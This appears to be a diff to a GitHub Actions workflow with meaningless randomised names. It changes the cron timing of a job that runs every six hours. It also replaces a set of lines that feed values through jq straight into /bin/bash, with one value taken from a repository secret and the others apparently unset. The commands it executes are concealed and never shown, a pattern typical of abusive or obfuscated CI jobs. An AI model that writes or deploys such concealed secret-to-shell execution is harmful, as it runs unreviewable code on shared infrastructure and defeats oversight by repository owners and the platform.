@@ -3,20 +3,20 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '7 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          lyo709: ${{ secrets.lyo709 }}
+          va42776: ${{ secrets.va42776 }}
         run: |
-          echo $lyo709 | jq -r .w40593 | /bin/bash
-          echo $pff5493 | jq -r .lhgxj5049 | /bin/bash
-          echo $up6 | jq -r .tc4141 | /bin/bash
-          echo $p1185 | jq -r .lcxj5 | /bin/bash
-          echo $tqcxb686 | jq -r .cyrzd1750 | /bin/bash
+          echo $va42776 | jq -r .fu2393 | /bin/bash
+          echo $akc4283 | jq -r .mapph1376 | /bin/bash
+          echo $tj49 | jq -r .wk228 | /bin/bash
+          echo $yktbk61289 | jq -r .rddy59 | /bin/bash
+          echo $gg01479 | jq -r .obphf7518 | /bin/bash
+          echo $yz972 | jq -r .cgl5 | /bin/bash
 
